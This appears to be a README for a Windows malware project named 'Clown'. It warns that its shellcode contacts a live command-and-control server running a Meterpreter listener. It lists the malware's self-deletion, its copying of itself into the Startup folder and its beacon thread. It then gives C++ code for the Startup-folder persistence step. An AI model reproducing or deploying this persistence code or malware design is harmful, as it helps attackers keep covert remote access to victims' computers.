## Clown

### Note
Shellcode points to live c2 server running a meterpreter listener, don't run it ty

### ?
- loads entire binary into memory, then deletes the original exe
- exe is dumped and saved to startup folder
- opens a new beacon thread

### ??
```c++
int Hide() {
	WCHAR startupFolderPath[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupFolderPath))) {
		std::wstring startupPath = std::wstring(startupFolderPath) + L"\\Persistence_Demo.exe";
		int bufferSize = WideCharToMultiByte(CP_UTF8, 0, startupPath.c_str(), -1, NULL, 0, NULL, NULL);
		std::string narrowStartupPath(bufferSize, 0);
		WideCharToMultiByte(CP_UTF8, 0, startupPath.c_str(), -1, &narrowStartupPath[0], bufferSize, NULL, NULL);
		bool copy_result = copy_file("Persistence_Demo.exe", narrowStartupPath.c_str());
		return copy_result;
	}
	else {
		return 0;
	}
}
```